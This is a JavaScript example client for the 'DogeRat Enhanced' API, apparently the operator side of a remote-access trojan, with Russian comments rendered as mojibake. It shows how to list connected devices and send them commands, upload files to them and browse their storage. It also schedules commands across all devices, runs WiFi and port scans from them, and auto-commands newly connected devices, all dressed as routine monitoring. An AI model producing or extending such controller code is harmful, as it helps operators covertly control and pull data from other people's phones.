// –ü—Ä–∏–º–µ—Ä—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è API DogeRat Enhanced

const axios = require('axios');

// –ë–∞–∑–æ–≤—ã–π URL —Å–µ—Ä–≤–µ—Ä–∞ (–∏–∑–º–µ–Ω–∏—Ç–µ –Ω–∞ –≤–∞—à)
const BASE_URL = 'http://localhost:3000';

class DogeRatAPI {
    constructor(baseUrl = BASE_URL) {
        this.baseUrl = baseUrl;
        this.axios = axios.create({
            baseURL: baseUrl,
            timeout: 10000,
            headers: {
                'Content-Type': 'application/json'
            }
        });
    }

    // –ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤
    async getDevices() {
        try {
            const response = await this.axios.get('/api/devices');
            return response.data;
        } catch (error) {
            console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è —Å–ø–∏—Å–∫–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤:', error.message);
            return null;
        }
    }

    // –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–º–∞–Ω–¥—ã —É—Å—Ç—Ä–æ–π—Å—Ç–≤—É
    async sendCommand(deviceId, command, params = {}) {
        try {
            const response = await this.axios.post('/api/command', {
                deviceId,
                command,
                params
            });
            return response.data;
        } catch (error) {
            console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–º–∞–Ω–¥—ã:', error.message);
            return null;
        }
    }

    // –ü–æ–ª—É—á–µ–Ω–∏–µ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏
    async getStatistics() {
        try {
            const response = await this.axios.get('/api/statistics');
            return response.data;
        } catch (error) {
            console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏:', error.message);
            return null;
        }
    }

    // –ü–æ–ª—É—á–µ–Ω–∏–µ –∏—Å—Ç–æ—Ä–∏–∏ –∫–æ–º–∞–Ω–¥
    async getCommandHistory(limit = 50) {
        try {
            const response = await this.axios.get(`/api/commands?limit=${limit}`);
            return response.data;
        } catch (error) {
            console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –∏—Å—Ç–æ—Ä–∏–∏ –∫–æ–º–∞–Ω–¥:', error.message);
            return null;
        }
    }

    // –ü–æ–ª—É—á–µ–Ω–∏–µ —Å–æ–±—ã—Ç–∏–π –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
    async getSecurityEvents(limit = 20) {
        try {
            const response = await this.axios.get(`/api/security?limit=${limit}`);
            return response.data;
        } catch (error) {
            console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è —Å–æ–±—ã—Ç–∏–π –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏:', error.message);
            return null;
        }
    }

    // –°–æ–∑–¥–∞–Ω–∏–µ –∑–∞–¥–∞—á–∏ –≤ –ø–ª–∞–Ω–∏—Ä–æ–≤—â–∏–∫–µ
    async createScheduledTask(name, command, schedule, deviceId = 'all') {
        try {
            const response = await this.axios.post('/api/scheduler/tasks', {
                name,
                command,
                schedule,
                deviceId
            });
            return response.data;
        } catch (error) {
            console.error('–û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è –∑–∞–¥–∞—á–∏:', error.message);
            return null;
        }
    }

    // –ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ –∑–∞–¥–∞—á
    async getScheduledTasks() {
        try {
            const response = await this.axios.get('/api/scheduler/tasks');
            return response.data;
        } catch (error) {
            console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –∑–∞–¥–∞—á:', error.message);
            return null;
        }
    }

    // –ó–∞–≥—Ä—É–∑–∫–∞ —Ñ–∞–π–ª–∞
    async uploadFile(filePath, deviceId) {
        try {
            const FormData = require('form-data');
            const fs = require('fs');
            
            const form = new FormData();
            form.append('file', fs.createReadStream(filePath));
            form.append('deviceId', deviceId);
            
            const response = await this.axios.post('/api/files/upload', form, {
                headers: form.getHeaders()
            });
            return response.data;
        } catch (error) {
            console.error('–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–∞:', error.message);
            return null;
        }
    }

    // –ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ —Ñ–∞–π–ª–æ–≤
    async getFileList(deviceId, path = '/') {
        try {
            const response = await this.axios.get('/api/files/list', {
                params: { deviceId, path }
            });
            return response.data;
        } catch (error) {
            console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è —Å–ø–∏—Å–∫–∞ —Ñ–∞–π–ª–æ–≤:', error.message);
            return null;
        }
    }

    // –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —Å–µ—Ç–µ–≤–æ–≥–æ —Ç–µ—Å—Ç–∞
    async performNetworkTest(deviceId, testType, target) {
        try {
            const response = await this.axios.post('/api/network/test', {
                deviceId,
                testType, // 'ping', 'traceroute', 'portscan'
                target
            });
            return response.data;
        } catch (error) {
            console.error('–û—à–∏–±–∫–∞ —Å–µ—Ç–µ–≤–æ–≥–æ —Ç–µ—Å—Ç–∞:', error.message);
            return null;
        }
    }
}

// –ü—Ä–∏–º–µ—Ä—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è
async function examples() {
    const api = new DogeRatAPI();

    console.log('üöÄ –ü—Ä–∏–º–µ—Ä—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è DogeRat Enhanced API\n');

    // 1. –ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤
    console.log('üì± –ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤...');
    const devices = await api.getDevices();
    if (devices) {
        console.log(`–ù–∞–π–¥–µ–Ω–æ —É—Å—Ç—Ä–æ–π—Å—Ç–≤: ${devices.length}`);
        devices.forEach(device => {
            console.log(`  - ${device.id} (${device.model}) - ${device.status}`);
        });
    }
    console.log('');

    // 2. –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–º–∞–Ω–¥—ã
    console.log('üì§ –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–º–∞–Ω–¥—ã –ø–æ–ª—É—á–µ–Ω–∏—è —Å–∏—Å—Ç–µ–º–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏...');
    const commandResult = await api.sendCommand('device_001', 'get_system_info');
    if (commandResult) {
        console.log('–ö–æ–º–∞–Ω–¥–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ —É—Å–ø–µ—à–Ω–æ');
    }
    console.log('');

    // 3. –ü–æ–ª—É—á–µ–Ω–∏–µ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏
    console.log('üìä –ü–æ–ª—É—á–µ–Ω–∏–µ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏...');
    const stats = await api.getStatistics();
    if (stats) {
        console.log(`–í—Å–µ–≥–æ —É—Å—Ç—Ä–æ–π—Å—Ç–≤: ${stats.totalDevices}`);
        console.log(`–û–Ω–ª–∞–π–Ω —É—Å—Ç—Ä–æ–π—Å—Ç–≤: ${stats.onlineDevices}`);
        console.log(`–ö–æ–º–∞–Ω–¥ —Å–µ–≥–æ–¥–Ω—è: ${stats.commandsToday}`);
    }
    console.log('');

    // 4. –°–æ–∑–¥–∞–Ω–∏–µ –∑–∞–¥–∞—á–∏
    console.log('‚è∞ –°–æ–∑–¥–∞–Ω–∏–µ –∑–∞–¥–∞—á–∏ –≤ –ø–ª–∞–Ω–∏—Ä–æ–≤—â–∏–∫–µ...');
    const task = await api.createScheduledTask(
        '–ü—Ä–æ–≤–µ—Ä–∫–∞ –±–∞—Ç–∞—Ä–µ–∏',
        'get_battery_status',
        30, // –∫–∞–∂–¥—ã–µ 30 –º–∏–Ω—É—Ç
        'all'
    );
    if (task) {
        console.log(`–ó–∞–¥–∞—á–∞ —Å–æ–∑–¥–∞–Ω–∞: ${task.name} (ID: ${task.id})`);
    }
    console.log('');

    // 5. –ü–æ–ª—É—á–µ–Ω–∏–µ –∏—Å—Ç–æ—Ä–∏–∏ –∫–æ–º–∞–Ω–¥
    console.log('üìù –ü–æ–ª—É—á–µ–Ω–∏–µ –∏—Å—Ç–æ—Ä–∏–∏ –∫–æ–º–∞–Ω–¥...');
    const history = await api.getCommandHistory(10);
    if (history) {
        console.log(`–ü–æ—Å–ª–µ–¥–Ω–∏–µ ${history.length} –∫–æ–º–∞–Ω–¥:`);
        history.forEach(cmd => {
            console.log(`  - ${cmd.command} -> ${cmd.deviceId} (${new Date(cmd.timestamp).toLocaleString()})`);
        });
    }
    console.log('');

    // 6. –°–µ—Ç–µ–≤–æ–π —Ç–µ—Å—Ç
    console.log('üåê –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ ping —Ç–µ—Å—Ç–∞...');
    const networkTest = await api.performNetworkTest('device_001', 'ping', '8.8.8.8');
    if (networkTest) {
        console.log('Ping —Ç–µ—Å—Ç –∑–∞–ø—É—â–µ–Ω');
    }
    console.log('');

    // 7. –ü–æ–ª—É—á–µ–Ω–∏–µ —Å–æ–±—ã—Ç–∏–π –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
    console.log('üîí –ü–æ–ª—É—á–µ–Ω–∏–µ —Å–æ–±—ã—Ç–∏–π –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏...');
    const securityEvents = await api.getSecurityEvents(5);
    if (securityEvents) {
        console.log(`–ü–æ—Å–ª–µ–¥–Ω–∏–µ ${securityEvents.length} —Å–æ–±—ã—Ç–∏–π:`);
        securityEvents.forEach(event => {
            console.log(`  - ${event.event}: ${event.details} (${event.severity})`);
        });
    }
}

// –ü—Ä–∏–º–µ—Ä –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏–∏ —Å –≤–µ–±-—Ö—É–∫–∞–º–∏
class WebhookHandler {
    constructor(api) {
        this.api = api;
    }

    // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ —Å–æ–±—ã—Ç–∏—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
    async onDeviceConnected(deviceId) {
        console.log(`üü¢ –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–æ: ${deviceId}`);
        
        // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –∑–∞–ø—Ä–∞—à–∏–≤–∞–µ–º —Å–∏—Å—Ç–µ–º–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
        await this.api.sendCommand(deviceId, 'get_system_info');
        
        // –°–æ–∑–¥–∞–µ–º –∑–∞–¥–∞—á—É –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ –±–∞—Ç–∞—Ä–µ–∏
        await this.api.createScheduledTask(
            `–ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –±–∞—Ç–∞—Ä–µ–∏ ${deviceId}`,
            'get_battery_status',
            60,
            deviceId
        );
    }

    // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ —Å–æ–±—ã—Ç–∏—è –æ—Ç–∫–ª—é—á–µ–Ω–∏—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
    async onDeviceDisconnected(deviceId) {
        console.log(`üî¥ –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –æ—Ç–∫–ª—é—á–µ–Ω–æ: ${deviceId}`);
        
        // –ú–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å –ª–æ–≥–∏–∫—É –æ—á–∏—Å—Ç–∫–∏ –∏–ª–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π
    }

    // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏—Ö —Å–æ–±—ã—Ç–∏–π –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
    async onSecurityAlert(event) {
        console.log(`üö® –ö—Ä–∏—Ç–∏—á–µ—Å–∫–æ–µ —Å–æ–±—ã—Ç–∏–µ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏: ${event.event}`);
        
        // –ú–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–µ –¥–µ–π—Å—Ç–≤–∏—è
        if (event.severity === 'critical') {
            // –ù–∞–ø—Ä–∏–º–µ—Ä, –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–π IP
            console.log('–ü—Ä–∏–Ω—è—Ç–∏–µ –∑–∞—â–∏—Ç–Ω—ã—Ö –º–µ—Ä...');
        }
    }
}

// –ü—Ä–∏–º–µ—Ä –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏
class RealTimeMonitor {
    constructor(api) {
        this.api = api;
        this.isRunning = false;
    }

    start() {
        this.isRunning = true;
        this.monitorLoop();
    }

    stop() {
        this.isRunning = false;
    }

    async monitorLoop() {
        while (this.isRunning) {
            try {
                // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å—Ç–∞—Ç—É—Å —É—Å—Ç—Ä–æ–π—Å—Ç–≤ –∫–∞–∂–¥—ã–µ 30 —Å–µ–∫—É–Ω–¥
                const devices = await this.api.getDevices();
                if (devices) {
                    const onlineCount = devices.filter(d => d.status === 'online').length;
                    console.log(`üìä –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥: ${onlineCount}/${devices.length} —É—Å—Ç—Ä–æ–π—Å—Ç–≤ –æ–Ω–ª–∞–π–Ω`);
                }

                // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–æ–≤—ã–µ —Å–æ–±—ã—Ç–∏—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
                const securityEvents = await this.api.getSecurityEvents(1);
                if (securityEvents && securityEvents.length > 0) {
                    const latestEvent = securityEvents[0];
                    if (latestEvent.severity === 'critical' || latestEvent.severity === 'warning') {
                        console.log(`‚ö†Ô∏è –ù–æ–≤–æ–µ —Å–æ–±—ã—Ç–∏–µ: ${latestEvent.event}`);
                    }
                }

                // –ñ–¥–µ–º 30 —Å–µ–∫—É–Ω–¥
                await new Promise(resolve => setTimeout(resolve, 30000));
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞:', error.message);
                await new Promise(resolve => setTimeout(resolve, 5000));
            }
        }
    }
}

// –ü—Ä–∏–º–µ—Ä –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏–∏ –∑–∞–¥–∞—á
class TaskAutomation {
    constructor(api) {
        this.api = api;
    }

    // –°–æ–∑–¥–∞–Ω–∏–µ –Ω–∞–±–æ—Ä–∞ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã—Ö –∑–∞–¥–∞—á –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞
    async setupMonitoringTasks() {
        const tasks = [
            {
                name: '–ï–∂–µ—á–∞—Å–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ —Å–∏—Å—Ç–µ–º—ã',
                command: 'get_system_info',
                schedule: 60
            },
            {
                name: '–ü—Ä–æ–≤–µ—Ä–∫–∞ –±–∞—Ç–∞—Ä–µ–∏ –∫–∞–∂–¥—ã–µ 30 –º–∏–Ω—É—Ç',
                command: 'get_battery_status',
                schedule: 30
            },
            {
                name: '–°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ WiFi –∫–∞–∂–¥—ã–µ 2 —á–∞—Å–∞',
                command: 'wifi_scan',
                schedule: 120
            },
            {
                name: '–ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–µ—Ç–µ–≤–æ–≥–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è',
                command: 'ping:8.8.8.8',
                schedule: 15
            }
        ];

        console.log('‚öôÔ∏è –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –∑–∞–¥–∞—á –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞...');
        for (const taskData of tasks) {
            const task = await this.api.createScheduledTask(
                taskData.name,
                taskData.command,
                taskData.schedule,
                'all'
            );
            if (task) {
                console.log(`‚úÖ –°–æ–∑–¥–∞–Ω–∞ –∑–∞–¥–∞—á–∞: ${task.name}`);
            }
        }
    }

    // –ú–∞—Å—Å–æ–≤–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–º–∞–Ω–¥
    async sendBulkCommands(commands) {
        console.log(`üì§ –û—Ç–ø—Ä–∞–≤–∫–∞ ${commands.length} –∫–æ–º–∞–Ω–¥...`);
        
        const results = [];
        for (const cmd of commands) {
            const result = await this.api.sendCommand(cmd.deviceId, cmd.command, cmd.params);
            results.push({ command: cmd, result });
            
            // –ù–µ–±–æ–ª—å—à–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –∫–æ–º–∞–Ω–¥–∞–º–∏
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
        
        return results;
    }
}

// –≠–∫—Å–ø–æ—Ä—Ç –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –≤ –¥—Ä—É–≥–∏—Ö –º–æ–¥—É–ª—è—Ö
module.exports = {
    DogeRatAPI,
    WebhookHandler,
    RealTimeMonitor,
    TaskAutomation
};

// –ó–∞–ø—É—Å–∫ –ø—Ä–∏–º–µ—Ä–æ–≤, –µ—Å–ª–∏ —Ñ–∞–π–ª –∑–∞–ø—É—â–µ–Ω –Ω–∞–ø—Ä—è–º—É—é
if (require.main === module) {
    examples().catch(console.error);
}